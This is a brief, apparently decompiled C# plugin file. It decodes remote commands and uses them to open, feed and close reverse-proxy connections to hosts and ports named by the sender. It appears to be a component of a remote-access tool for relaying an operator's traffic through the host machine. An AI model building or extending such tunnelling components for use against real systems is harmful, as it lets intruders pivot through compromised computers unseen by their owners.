using System;
using System.Collections.Generic;
using System.Linq;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static object _proxyClientsLock = new object();

	public static List<ReverseProxyClient> _proxyClients = new List<ReverseProxyClient>();

	public static void ConnectReverseProxy(int ConnectionId, string Target, int Port)
	{
		lock (_proxyClientsLock)
		{
			_proxyClients.Add(new ReverseProxyClient(ConnectionId, Target, Port));
		}
	}

	public static ReverseProxyClient GetReverseProxyByConnectionId(int connectionId)
	{
		lock (_proxyClientsLock)
		{
			return _proxyClients.FirstOrDefault((ReverseProxyClient t) => t.ConnectionId == connectionId);
		}
	}

	public static void RemoveProxyClient(int connectionId)
	{
		try
		{
			lock (_proxyClientsLock)
			{
				for (int i = 0; i < _proxyClients.Count; i++)
				{
					if (_proxyClients[i].ConnectionId == connectionId)
					{
						_proxyClients.RemoveAt(i);
						break;
					}
				}
			}
		}
		catch
		{
		}
	}

	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "Connect":
				ConnectReverseProxy((int)array[1], (string)array[2], (int)array[3]);
				break;
			case "Data":
				GetReverseProxyByConnectionId((int)array[1]).SendToTargetServer((byte[])array[2]);
				break;
			case "Disconnect":
				GetReverseProxyByConnectionId((int)array[1]).Disconnect();
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Error(ex.ToString());
		}
	}
}
